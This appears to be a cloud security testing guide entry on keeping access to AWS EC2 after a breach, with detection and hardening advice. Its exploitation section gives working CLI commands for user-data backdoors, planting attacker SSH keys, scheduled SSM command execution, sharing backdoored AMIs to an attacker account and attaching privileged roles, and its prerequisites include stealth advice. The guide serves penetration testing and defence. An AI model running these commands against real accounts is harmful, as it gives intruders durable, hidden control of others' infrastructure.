---
cstg_id: CSTG-AWS-EC2-PERSIST
title: "AWS Ec2 - Persistence"
provider: aws
service: ec2
phase: persistence
required_access: assumed-breach
required_permissions:
  - ec2:ModifyInstanceAttribute
  - ec2:CreateKeyPair
  - ec2:ImportKeyPair
  - ec2:CreateImage
  - ec2:CreateSnapshot
  - ec2:RegisterImage
  - ec2:ModifyImageAttribute
  - ec2-instance-connect:SendSSHPublicKey
  - ssm:SendCommand
  - ssm:CreateDocument
  - ssm:CreateAssociation
  - iam:AddRoleToInstanceProfile
  - iam:PassRole
references:
  - "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html"
  - "https://docs.aws.amazon.com/systems-manager/latest/userguide/sysman-state-manager.html"
  - "https://docs.aws.amazon.com/systems-manager/latest/userguide/documents.html"
  - "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-key-pairs.html"
  - "https://hackingthe.cloud/aws/post_exploitation/"
  - "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
license: CC BY-SA 4.0
---

## Summary

Persistence on EC2 lets an attacker retain access to instances and to the account-level compute plane even after the initial foothold is patched, credentials rotated, or a shell closed. Techniques span the OS layer (keys, boot scripts) and the AWS control plane (user-data injection, malicious AMIs, SSM State Manager associations, instance-profile changes). The attacker objective is durable, low-noise re-entry that survives reboots, re-deployments, and credential rotation.

## Prerequisites

- An authenticated principal or instance role with one or more of the permissions in the frontmatter (assumed breach), and/or OS access to a target instance.
- Note: persistence actions are control-plane changes that CloudTrail records; choose techniques that blend with normal operations (e.g. SSM, user-data) where stealth matters.

## Enumeration

```bash
# Confirm targets and existing state to blend in
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,KeyName,State.Name]'
aws ec2 describe-key-pairs
aws ssm list-associations
aws ssm list-documents --filters Key=Owner,Values=Self
aws ec2 describe-images --owners self
aws iam list-instance-profiles
```

## Misconfigurations & Findings

- Principals able to `ModifyInstanceAttribute` (user-data) on stopped instances, enabling boot-time payloads.
- Broad `ec2:ImportKeyPair`/`CreateKeyPair` allowing attacker key material to be planted.
- `ssm:CreateDocument` + `CreateAssociation` permitting scheduled command execution across fleets.
- Ability to register/share malicious AMIs that downstream launches will trust.
- `iam:AddRoleToInstanceProfile`/`PassRole` enabling attachment of a privileged or attacker-trusted role to instances.

## Exploitation

### User-data backdoor (ModifyInstanceAttribute)

User-data scripts run at boot (and can be configured to run on every boot). Stop the instance, replace its user-data with a payload that re-establishes access, then start it.

```bash
aws ec2 stop-instances --instance-ids i-0target
aws ec2 modify-instance-attribute --instance-id i-0target \
  --attribute userData --value file://payload-b64.txt   # base64 of a boot script
aws ec2 start-instances --instance-ids i-0target
```

A reverse shell or key-install in user-data survives reboots if the script is set to run each boot.

### SSH key persistence

Plant attacker-controlled key material, either at the OS layer (`~/.ssh/authorized_keys`) via an existing shell/SSM, or by importing a key pair and ensuring instances accept it.

```bash
aws ec2 import-key-pair --key-name backup-ops --public-key-material fileb://attacker.pub
# or push on demand without persistent storage:
aws ec2-instance-connect send-ssh-public-key --instance-id i-0target \
  --instance-os-user ec2-user --ssh-public-key file://attacker.pub --availability-zone us-east-1a
```

### SSM State Manager association (scheduled execution)

Create a custom SSM document and bind it to instances via an association that runs on a schedule, giving recurring command execution that looks like legitimate fleet management.

```bash
aws ssm create-document --name "maint-task" --document-type Command \
  --content file://malicious-runshell.json
aws ssm create-association --name "maint-task" \
  --targets Key=tag:Environment,Values=prod \
  --schedule-expression "rate(30 minutes)"
```

### Malicious / backdoored AMI

Create an AMI from a compromised instance (with backdoors baked in), then ensure it is used by launch templates / Auto Scaling Groups, or share it to other accounts. Every instance launched from it is pre-compromised.

```bash
aws ec2 create-image --instance-id i-0compromised --name "golden-prod" --no-reboot
aws ec2 modify-image-attribute --image-id ami-0new \
  --launch-permission "Add=[{UserId=<attacker-account>}]"
```

### Instance-profile / role attachment

Attach an attacker-trusted or more-privileged role to an instance so its IMDS continuously serves useful credentials, or so a role the attacker can assume cross-account is reachable.

```bash
aws iam add-role-to-instance-profile --instance-profile-name <profile> --role-name <role>
aws ec2 associate-iam-instance-profile --instance-id i-0target \
  --iam-instance-profile Name=<profile>
```

## Detection & Logging

- CloudTrail records every control-plane persistence action: `ModifyInstanceAttribute` (especially `attribute=userData`), `ImportKeyPair`/`CreateKeyPair`, `CreateImage`/`RegisterImage`/`ModifyImageAttribute`, `SendSSHPublicKey`, `CreateDocument`/`CreateAssociation`/`UpdateAssociation`, `AddRoleToInstanceProfile`, and `AssociateIamInstanceProfile`.
- `ModifyInstanceAttribute` on `userData` and new SSM associations/documents are rare in normal operations and make high-signal alerts.
- `ModifyImageAttribute` adding an external account to an AMI launch permission indicates cross-account AMI sharing for persistence.
- `ec2-instance-connect:SendSSHPublicKey` is logged; repeated or off-hours use to many instances is suspicious.
- GuardDuty flags some persistence and credential patterns; combine with EventBridge rules on the API actions above.
- OS-level changes (authorized_keys edits) are not in CloudTrail; require host logging/file-integrity monitoring.

## Remediation & Hardening

- **Restrict `ModifyInstanceAttribute` on user-data** and treat immutable infrastructure as the norm; alert on any user-data change.
- **Govern key pairs and SSM documents/associations**: limit who can import keys, create documents, or create associations; review existing associations regularly.
- **Lock down AMI permissions**: prevent public/cross-account AMI sharing; verify launch templates/ASGs reference approved AMIs only.
- **Constrain `iam:PassRole` and instance-profile changes** so privileged roles cannot be attached to arbitrary instances.
- **Enforce IMDSv2 and short-lived credentials**, and rotate/replace instances rather than long-running pets.
- **Detective controls:** EventBridge alerts on the persistence API actions above; file-integrity monitoring and centralised auth logs on instances.

## Tools

- AWS CLI / SDKs for the user-data, key pair, AMI, SSM, and instance-profile operations.
- SSM State Manager for scheduled execution (dual-use; neutral).
- Configuration/inventory drift detection to surface unauthorized associations, key pairs, and AMIs.

## References

- AWS user-data, SSM State Manager, and SSM documents documentation.
- AWS EC2 key pairs documentation.
- hackingthe.cloud - AWS post-exploitation.
- Rhino Security Labs - AWS privilege escalation and persistence.
